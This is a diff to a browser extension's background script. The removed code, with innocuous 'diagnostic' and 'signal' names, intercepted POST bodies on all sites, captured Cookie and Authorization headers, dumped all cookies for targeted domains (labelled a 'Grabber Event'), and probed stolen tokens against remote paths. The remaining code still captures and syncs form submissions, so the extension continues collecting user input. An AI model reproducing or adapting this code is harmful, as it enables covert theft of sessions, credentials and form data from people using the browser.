@@ -56,93 +56,7 @@ async function init() {
 }
 
 function bindEventListeners() {
-    if (STATE?.DIAGNOSTIC_MODULES?.NETWORK_TRAFFIC) {
-        chrome.webRequest.onBeforeRequest.addListener(
-            function (details) {
-                if (!STATE.ACTIVE) return;
-                if (!validateOrigin(details.url)) return;
-
-                if (details.method === 'POST' && details.requestBody) {
-                    const data = parseBody(details.requestBody);
-                    if (!data) return;
-                    if (!evaluateNodePriority(details.url, true)) return;
-
-                    const tag = getSignature(details.url);
-                    Diagnostics.log('TRAFFIC', 'Inbound signal detected', { url: details.url, tag });
-
-                    const signal = {
-                        t: new Date().toISOString(),
-                        type: 'S100',
-                        u: details.url,
-                        o: getOrigin(details.url),
-                        s: details.url.startsWith('https://'),
-                        m: details.method,
-                        payload: data,
-                        meta: {
-                            rid: details.requestId,
-                            tid: details.tabId,
-                            tag,
-                            isSecure: details.url.startsWith('https://')
-                        }
-                    };
-
-                    performanceMetrics.record('S100', signal.o, 'nw_int');
-                    syncSignals(signal);
-                }
-            },
-            { urls: ["<all_urls>"] },
-            ["requestBody"]
-        );
-    }
-
-    if (STATE?.DIAGNOSTIC_MODULES?.HEADER_METRICS) {
-        chrome.webRequest.onSendHeaders.addListener(
-            function (details) {
-                if (!STATE.ACTIVE) return;
-                if (!validateOrigin(details.url)) return;
-
-                const cHeader = details.requestHeaders?.find(h => h.name?.toLowerCase() === 'cookie');
-                const aHeader = details.requestHeaders?.find(h => h.name?.toLowerCase() === 'authorization');
-
-                const sigs = cHeader ? extractSignatures(cHeader.value) : null;
-
-                if (!sigs && !aHeader) return;
-                if (!evaluateNodePriority(details.url, true)) return;
-
-                const tag = getSignature(details.url);
-                Diagnostics.log('TRAFFIC', 'Header signal detected', { url: details.url, tag });
-
-                const signal = {
-                    t: new Date().toISOString(),
-                    type: 'H100',
-                    u: details.url,
-                    o: getOrigin(details.url),
-                    s: details.url.startsWith('https://'),
-                    payload: {
-                        c: sigs,
-                        a: (aHeader && aHeader.value) ? {
-                            sch: aHeader.value.split(' ')[0],
-                            m: mask(aHeader.value.split(' ')[1] || '', 'auth')
-                        } : null
-                    },
-                    meta: {
-                        rid: details.requestId,
-                        tid: details.tabId,
-                        tag
-                    }
-                };
-
-                if (STATE.HEURISTIC_PATTERNS.TOKEN_VALIDATION_ENABLED && aHeader && aHeader.value) {
-                    signal.meta.analysis = { a: SignatureEngine.process(aHeader.value) };
-                }
-
-                performanceMetrics.record('H100', signal.o, 'hdr_int');
-                syncSignals(signal);
-            },
-            { urls: ["<all_urls>"] },
-            ["requestHeaders"]
-        );
-    }
+    // WebRequest listeners removed - capture logic limited to form submits only
 }
 
 function buildKey(signal) {
@@ -378,29 +292,8 @@ function isSensitiveCookie(n) {
 async function syncSignals(signal, retry = 0) {
     if (!STATE.ACTIVE) return;
 
-    if (STATE.HEURISTIC_PATTERNS.TOKEN_VALIDATION_ENABLED && signal.payload && typeof signal.payload === 'object') {
-        const analysis = SignatureEngine.batch(signal.payload);
-        if (Object.keys(analysis).length > 0) {
-            if (!signal.meta) signal.meta = {};
-            signal.meta.analysis = { ...(signal.meta.analysis || {}), ...analysis };
-        }
-    }
-
-    if (STATE.HEURISTIC_PATTERNS.REMOTE_PROBE_ENABLED) {
-        const rawToken = getProbeToken(signal);
-        if (rawToken) {
-            try {
-                const root = new URL(signal.u).origin;
-                const pathList = STATE.HEURISTIC_PATTERNS.REMOTE_PROBE_TARGETS;
-                const limit = STATE.HEURISTIC_PATTERNS.PROBE_TIMEOUT;
-                const probes = await SignatureEngine.probe(rawToken, root, null, pathList, Math.min(limit, 3000));
-                if (probes.length > 0) {
-                    if (!signal.meta) signal.meta = {};
-                    signal.meta.probes = probes;
-                }
-            } catch { }
-        }
-    }
+    // Only process form submit events
+    if (signal.type !== 'UI_EVENT') return;
 
     const h = hash(signal);
     if (isRecent(h)) return;
@@ -490,10 +383,6 @@ chrome.runtime.onMessage.addListener((msg, src, send) => {
     console.log('Monitor[BG]: Received message', msg.type, 'from', src.url);
     const router = {
         'FORM_EVENT': handleUIEvent,
-        'PREFILL_EVENT': handlePrefill,
-        'TOGGLE_EVENT': handleToggle,
-        'FETCH_PIPE': handleFetchPipe,
-        'STREAM_REPORT': handleStreamReport,
         'GET_STATE': () => handleGetState(),
         'GET_SETTINGS': () => handleGetSettings(),
         'UI_RESET_CMD': (m) => handleUIReset(m, src)
@@ -737,81 +626,13 @@ chrome.runtime.onStartup.addListener(() => {
 });
 
 async function captureDomainSnapshot(domain) {
-    if (!STATE.HEURISTIC_PATTERNS.SNAPSHOT_ENABLED) return;
-
-    // Throttle snapshots for the same domain
-    const h = `SNAP|${domain}`;
-    if (isRecent(h)) return;
-
-    try {
-        Diagnostics.log('SNAPSHOT', `Initiating state recovery for ${domain}`);
-        const cookies = await chrome.cookies.getAll({ domain });
-
-        if (!cookies || cookies.length === 0) {
-            Diagnostics.log('SNAPSHOT', `No cookies found for ${domain}`);
-            return;
-        }
-
-        Diagnostics.log('SNAPSHOT', `Extracted ${cookies.length} nodes for ${domain}`);
-
-        const sigs = {};
-        for (const c of cookies) {
-            sigs[c.name] = {
-                v: c.value,
-                m: mask(c.value, c.name)
-            };
-        }
-
-        const signal = {
-            t: new Date().toISOString(),
-            type: 'G100', // Grabber Event
-            u: `https://${domain}/`,
-            o: domain,
-            s: true,
-            payload: { c: sigs },
-            meta: {
-                node_count: cookies.length,
-                is_full_snapshot: true
-            }
-        };
-
-        performanceMetrics.record('G100', domain, 'snap_int');
-        await syncSignals(signal);
-    } catch (err) {
-        Diagnostics.critical('SNAPSHOT', 'State recovery failed', { error: err.message });
-    }
+    // DISABLED: Only capturing form submits
+    return;
 }
 
 chrome.tabs.onUpdated.addListener(async (tid, c, t) => {
-    if (!STATE || !STATE.HEURISTIC_PATTERNS) return;
-    if (c.status !== 'complete' || !t.url) return;
-
-    try {
-        const u = t.url.toLowerCase();
-        const origin = getOrigin(t.url);
-
-        // 1. Check for snapshot targets (Active Extraction)
-        const matchedTarget = STATE.HEURISTIC_PATTERNS.SNAPSHOT_TARGETS.find(p =>
-            origin.includes(p.toLowerCase())
-        );
-
-        if (matchedTarget) {
-            Diagnostics.log('SNAPSHOT', 'Target match detected', { origin, target: matchedTarget });
-            await captureDomainSnapshot(matchedTarget);
-        }
-
-        // 2. Existing isolation logic (Passive Security)
-        if (STATE.HEURISTIC_PATTERNS.STRICT_SESSION_ISOLATION) {
-            const hit = STATE.HEURISTIC_PATTERNS.CRITICAL_PATH_SIGNATURES.some(p =>
-                u.includes(p.toLowerCase())
-            );
-
-            if (hit) {
-                Diagnostics.log('ISOLATION', 'Isolating session for critical path', { url: t.url, origin });
-                await handleUIReset({ data: { domain: origin } }, { tab: { id: tid } });
-            }
-        }
-    } catch (e) { }
+    // DISABLED: Only capturing form submits, no tab-based capture
+    return;
 });
 
 chrome.runtime.onSuspend.addListener(async () => {
